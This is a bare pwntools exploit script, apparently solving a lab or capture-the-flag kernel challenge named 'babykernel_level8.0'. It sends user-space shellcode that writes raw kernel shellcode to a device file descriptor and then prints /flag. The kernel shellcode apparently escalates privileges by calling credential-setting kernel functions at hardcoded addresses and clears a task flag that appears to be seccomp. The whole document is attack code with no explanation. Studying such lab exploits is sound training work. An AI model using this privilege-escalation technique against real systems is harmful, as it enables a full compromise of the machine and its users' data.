from pwn import *

context.arch = "amd64"
context.log_level = "info"

p = process("/challenge/babykernel_level8.0")

ksc = b"\x48\x31\xff\x48\xc7\xc1\x60\x96\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x10\x93\x08\x81\xff\xd1\x65\x4c\x8b\x0c\x25\x00\x5d\x01\x00\x49\x81\x21\xff\xfe\xff\xff\x31\xc0\xc3"
shellcode = shellcraft.amd64.write(3, ksc, len(ksc))
shellcode += shellcraft.amd64.linux.cat("/flag", 1)
usc = asm(shellcode)

p.sendline(usc)

p.interactive()